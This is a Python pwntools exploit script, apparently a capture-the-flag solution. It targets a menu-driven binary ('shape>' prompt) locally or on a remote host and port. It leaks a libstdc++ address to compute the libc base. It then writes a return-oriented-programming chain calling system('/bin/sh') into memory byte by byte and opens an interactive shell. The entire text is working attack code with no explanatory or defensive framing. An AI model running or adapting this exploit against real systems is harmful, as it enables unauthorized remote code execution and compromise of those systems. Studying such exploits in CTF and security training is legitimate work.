import sys
import logging
from pwn import *
logging.basicConfig(level=logging.INFO, format="%(message)s")
#logging.disable(logging.CRITICAL)

if len(sys.argv) == 2:
    program_name = sys.argv[1]
    target = process(program_name)
    logging.info("***local exploit ***")

else:
    HOST = sys.argv[1]
    PORT = int(sys.argv[2])
    logging.info("***remote exploit ***")
    logging.info("[*]target host : " + HOST)
    logging.info("[*]target port : " + str(PORT))
    target = remote(HOST, PORT)

###address###
pop_rdi =  0x0000000000400ee3

libstdc_func_off = 0x00000000000ed7c0
libc_system_off = 0x000000000004f4e0
libc_binsh_off = 0x1b40fa 

ret_addr = 0x00000000004008ae

def write_payload(payload, counter):
    for i in range(len(payload)):
        _ = target.recvuntil("shape> ")
        print(struct.pack("B", payload[i]) + b" 11 " + str(counter).encode())
        target.sendline(struct.pack("B", payload[i]) + b" 11 " + str(counter).encode())
        counter += 1
    return counter

###main###
def main():
    ###payload###
    _ = target.recvuntil("shape> ")
    target.sendline(b"d")

    _ = target.recvline()
    _ = target.recv(61)
    libstdc_addr = u64(target.recv(4) + target.recv(5)[1:]) - libstdc_func_off - 13
    print("[*] libstdc addr = 0x{:x}".format(libstdc_addr))
    libc_addr = libstdc_addr - 4132864
    print("[*] libc addr = 0x{:x}".format(libc_addr))

    libc_system_addr = libc_addr + libc_system_off
    libc_binsh_addr = libc_addr + libc_binsh_off

    counter = 10
    counter = write_payload(p64(ret_addr), counter)
    counter = write_payload(p64(pop_rdi), counter)
    counter = write_payload(p64(libc_binsh_addr), counter)
    counter = write_payload(p64(libc_system_addr), counter)
    counter = write_payload(p64(0), counter)

    _ = target.recvuntil("shape> ")
    target.sendline(b"d")

    target.interactive()


if __name__ == "__main__":
    main()